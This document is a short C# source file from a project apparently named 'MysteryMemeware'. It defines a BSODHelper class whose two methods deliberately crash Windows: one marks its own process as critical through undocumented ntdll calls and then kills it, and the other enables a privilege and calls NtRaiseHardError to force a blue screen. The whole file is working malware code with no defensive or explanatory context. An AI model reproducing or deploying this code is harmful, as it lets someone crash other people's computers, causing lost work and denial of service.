namespace MysteryMemeware
{
    public static class BSODHelper
    {
        public static unsafe void BSODACPD()
        {
            try
            {
                uint returnCode = RtlAdjustPrivilege(20, true, false, out bool previousPrivlageValue);
            }
            catch
            {

            }
            bool previousCriticalValue = false;
            bool* previousCriticalValuePointer = &previousCriticalValue;
            RtlSetProcessIsCritical(true, previousCriticalValuePointer, false);
            ProcessHelper.CurrentProcess.Kill();
        }
        public static void BSODRHE()
        {
            try
            {
                RtlAdjustPrivilege(19, true, false, out _);
            }
            catch
            {
            }
            NtRaiseHardError(0xc0000022, 0, 0, System.IntPtr.Zero, 6, out _);
        }
        [System.Runtime.InteropServices.DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
        [System.Runtime.InteropServices.DllImport("ntdll.dll", CallingConvention = System.Runtime.InteropServices.CallingConvention.Cdecl)]
        private static unsafe extern void RtlSetProcessIsCritical(bool a, bool* b, bool c);
        [System.Runtime.InteropServices.DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, System.IntPtr Parameters, uint ValidResponseOption, out uint Response);
    }
}